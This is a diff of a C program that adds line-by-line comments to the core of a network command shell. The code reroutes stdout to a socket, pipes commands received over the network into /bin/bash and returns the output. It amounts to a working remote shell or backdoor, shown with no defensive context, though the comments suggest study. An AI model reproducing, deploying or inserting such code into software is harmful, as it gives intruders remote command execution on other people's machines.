@@ -36,25 +36,25 @@ int main() {
             fflush(stdout);
         } else {
             close(fd);
-            dup2(cfd, 1);
-            FILE *bash = popen("/bin/bash", "w");
+            dup2(cfd, 1); // rerouting stdout to network socket
+            FILE *bash = popen("/bin/bash", "w"); //opening pipe to new process running bash
             if (bash == NULL)
-                return 1;
+                return 1; //error
 
             char buf[256] = {0};
             int e = 0;
             do {
-                e = read(cfd, buf, 256);
-                if (e == -1) break;
-                if (strncmp(buf, "exit", 4) == 0) {
+                e = read(cfd, buf, 256); //reading command from web
+                if (e == -1) break; //socket connection closed
+                if (strncmp(buf, "exit", 4) == 0) { //handling clean exit
                     fclose(bash);
                     close(cfd);
                     exit(0);
                 }
-                for (int i = e; i < 256; i++) buf[i] = 0;
-                fprintf(bash, "%s\n", buf);
-                fflush(bash);
-                write(cfd, "\n", 1);
+                for (int i = e; i < 256; i++) buf[i] = 0; //nulling buffer part after received text
+                fprintf(bash, "%s\n", buf); //writing command to bash process
+                fflush(bash); //flushing pipe to bash
+                write(cfd, "\n", 1); //wrinting \n to network socket
             } while (1);
             close(cfd);
             fclose(bash);
